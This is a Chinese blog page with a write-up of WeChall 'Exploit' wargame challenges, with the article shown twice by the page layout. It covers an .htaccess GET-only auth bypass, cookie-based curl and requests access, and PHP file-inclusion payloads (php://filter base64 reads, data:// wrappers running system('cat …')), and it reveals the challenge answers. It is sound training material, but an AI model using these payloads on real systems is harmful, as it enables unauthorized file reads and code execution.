<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./WeChall-Exploit-writeup/font-awesome.min.css" rel="stylesheet"/>
<link href="./WeChall-Exploit-writeup/screen.css" rel="stylesheet"/>
<link href="./WeChall-Exploit-writeup/prism_okaidia.css" rel="stylesheet"/>
<link href="./WeChall-Exploit-writeup/bendawang.css" rel="stylesheet"/>
<script src="./WeChall-Exploit-writeup/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./WeChall-Exploit-writeup/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./WeChall-Exploit-writeup/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="wechallexploitwriteup">WeChall Exploit writeup</h1>
<p style="max-width:100%;height:auto;">有一些题目在PHP、MYSQL里面就已经做过了，所以这里题解就不再写了，想看的可以去看看我写的Mysql和PHP的Writeup。</p>
<p style="max-width:100%;height:auto;">Wechall Exploit系列题目链接：http://www.wechall.net/challs/Exploit</p>
<h2 id="limitedaccess">Limited Access</h2>
<p style="max-width:100%;height:auto;">刚刚学完<code style="max-width:100%;height:auto;">.htaccess</code>的各种知识就遇到这样的题了，真是不能更赞。
这里直接进Mypage，会出现这样子的错误</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090345989" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这时候看看它的<code style="max-width:100%;height:auto;">.htaccess</code>文件，如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">AuthUserFile .htpasswd
AuthGroupFile /dev/null
AuthName "Authorization Required for the Limited Access Challenge"
AuthType Basic
&lt;Limit GET&gt;
require valid-user
&lt;/Limit&gt;
</code></pre>
<p style="max-width:100%;height:auto;">看到了很关键的东西就是他限制了GET，然后又看到第一个是<code style="max-width:100%;height:auto;">AuthUserFile .htpasswd</code>那就试试POST，把这个<code style="max-width:100%;height:auto;">.htpasswd</code>传过去看看。然后就成功了。。。
当然还有一些别的思路</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;form method="POST" action="https://www.wechall.net/challenge/wannabe7331/limited_access/protected/protected.php"&gt;
&lt;input type="submit" value="submit"&gt;
&lt;/form&gt;
</code></pre>
<h2 id="limitedaccesstoo">Limited Access Too</h2>
<p style="max-width:100%;height:auto;">这里比较蛋疼，查了资料发现很多都说是用<code style="max-width:100%;height:auto;">curl</code>命令带上cookie就能够成功绕过，我试了试，果然可以</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -c "WC=8905651-18041-Z8otHq2wU99l96gV" -c 自己的cookie http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php
</code></pre>
<p style="max-width:100%;height:auto;">然后没太想明白为什么，于是我用python的requests又试了一下，如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">url="http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php"
params={&amp;apos;Cookie&amp;apos;:自己的cookie}
r=requests.get(url,headers=params).content
print r
</code></pre>
<p style="max-width:100%;height:auto;">发现还是可以的，原理我也不是太清楚，猜测是只要不是直接通过浏览器发送请求应该都可以。</p>
<h2 id="warchalllivelfi">Warchall: Live LFI</h2>
<p style="max-width:100%;height:auto;">点进链接之后，如下</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090402724" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">右上角两个<code style="max-width:100%;height:auto;">EN DE</code>是可以点击的，一点，我们需要的get参数就出来了。
参数就是<code style="max-width:100%;height:auto;">lang</code>，经过简单几次尝试之后，如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/index.php?lang=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">上述链接产生了这样子的结果，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090416064" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">那么，我们就可以试着看看这个<code style="max-width:100%;height:auto;">solution.php</code>的源码，</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">Base64解密之后得到源码如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
&lt;body&gt;
&lt;pre style="color:#000;"&gt;teh falg si naer!&lt;/pre&gt;
&lt;pre style="color:#fff;"&gt;the flag is near!&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php                  #   YOUR_TROPHY
return &amp;apos;SteppinStones42Pie&amp;apos;; # &lt;-Â´
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">所以答案就出来了，是<code style="max-width:100%;height:auto;">SteppinStones42Pie</code>。</p>
<h2 id="warchallliverfi">Warchall: Live RFI</h2>
<p style="max-width:100%;height:auto;">和上一道差不太多，这里我最开始使用的是</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php  print file_get_contents("solution.php")  ?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后得到答案：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">.....
.....
&lt;?php return &amp;apos;Low_H4NGING_Fruit&amp;apos;; ?&gt;
.....
.....
</code></pre>
<p style="max-width:100%;height:auto;">注意这里千万不要被蒙蔽了，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090426830" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这里虽然只看见这个东西，但是他的答案在后面，看网页源码就知道了，中间它给了很多很多空格来混淆视听。
但是这里其实直接用之前那个题的payload也可以的</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">还有一些别的思路</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php  system("cat solution.php")  ?&gt;
</code></pre>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./WeChall-Exploit-writeup/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="wechallexploitwriteup">WeChall Exploit writeup</h1>
<p style="max-width:100%;height:auto;">有一些题目在PHP、MYSQL里面就已经做过了，所以这里题解就不再写了，想看的可以去看看我写的Mysql和PHP的Writeup。</p>
<p style="max-width:100%;height:auto;">Wechall Exploit系列题目链接：http://www.wechall.net/challs/Exploit</p>
<h2 id="limitedaccess">Limited Access</h2>
<p style="max-width:100%;height:auto;">刚刚学完<code style="max-width:100%;height:auto;">.htaccess</code>的各种知识就遇到这样的题了，真是不能更赞。
这里直接进Mypage，会出现这样子的错误</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090345989" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这时候看看它的<code style="max-width:100%;height:auto;">.htaccess</code>文件，如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">AuthUserFile .htpasswd
AuthGroupFile /dev/null
AuthName "Authorization Required for the Limited Access Challenge"
AuthType Basic
&lt;Limit GET&gt;
require valid-user
&lt;/Limit&gt;
</code></pre>
<p style="max-width:100%;height:auto;">看到了很关键的东西就是他限制了GET，然后又看到第一个是<code style="max-width:100%;height:auto;">AuthUserFile .htpasswd</code>那就试试POST，把这个<code style="max-width:100%;height:auto;">.htpasswd</code>传过去看看。然后就成功了。。。
当然还有一些别的思路</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;form method="POST" action="https://www.wechall.net/challenge/wannabe7331/limited_access/protected/protected.php"&gt;
&lt;input type="submit" value="submit"&gt;
&lt;/form&gt;
</code></pre>
<h2 id="limitedaccesstoo">Limited Access Too</h2>
<p style="max-width:100%;height:auto;">这里比较蛋疼，查了资料发现很多都说是用<code style="max-width:100%;height:auto;">curl</code>命令带上cookie就能够成功绕过，我试了试，果然可以</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -c "WC=8905651-18041-Z8otHq2wU99l96gV" -c 自己的cookie http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php
</code></pre>
<p style="max-width:100%;height:auto;">然后没太想明白为什么，于是我用python的requests又试了一下，如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">url="http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php"
params={&amp;apos;Cookie&amp;apos;:自己的cookie}
r=requests.get(url,headers=params).content
print r
</code></pre>
<p style="max-width:100%;height:auto;">发现还是可以的，原理我也不是太清楚，猜测是只要不是直接通过浏览器发送请求应该都可以。</p>
<h2 id="warchalllivelfi">Warchall: Live LFI</h2>
<p style="max-width:100%;height:auto;">点进链接之后，如下</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090402724" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">右上角两个<code style="max-width:100%;height:auto;">EN DE</code>是可以点击的，一点，我们需要的get参数就出来了。
参数就是<code style="max-width:100%;height:auto;">lang</code>，经过简单几次尝试之后，如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/index.php?lang=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">上述链接产生了这样子的结果，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090416064" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">那么，我们就可以试着看看这个<code style="max-width:100%;height:auto;">solution.php</code>的源码，</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">Base64解密之后得到源码如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
&lt;body&gt;
&lt;pre style="color:#000;"&gt;teh falg si naer!&lt;/pre&gt;
&lt;pre style="color:#fff;"&gt;the flag is near!&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php                  #   YOUR_TROPHY
return &amp;apos;SteppinStones42Pie&amp;apos;; # &lt;-Â´
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">所以答案就出来了，是<code style="max-width:100%;height:auto;">SteppinStones42Pie</code>。</p>
<h2 id="warchallliverfi">Warchall: Live RFI</h2>
<p style="max-width:100%;height:auto;">和上一道差不太多，这里我最开始使用的是</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php  print file_get_contents("solution.php")  ?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后得到答案：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">.....
.....
&lt;?php return &amp;apos;Low_H4NGING_Fruit&amp;apos;; ?&gt;
.....
.....
</code></pre>
<p style="max-width:100%;height:auto;">注意这里千万不要被蒙蔽了，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-Exploit-writeup/20160410090426830" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这里虽然只看见这个东西，但是他的答案在后面，看网页源码就知道了，中间它给了很多很多空格来混淆视听。
但是这里其实直接用之前那个题的payload也可以的</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
</code></pre>
<p style="max-width:100%;height:auto;">还有一些别的思路</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php  system("cat solution.php")  ?&gt;
</code></pre>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./WeChall-Exploit-writeup/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./WeChall-Exploit-writeup/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./WeChall-Exploit-writeup/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./WeChall-Exploit-writeup/prism.js"></script>
<script src="./WeChall-Exploit-writeup/zooming.js"></script>
<script src="./WeChall-Exploit-writeup/Bendawang.js"></script>


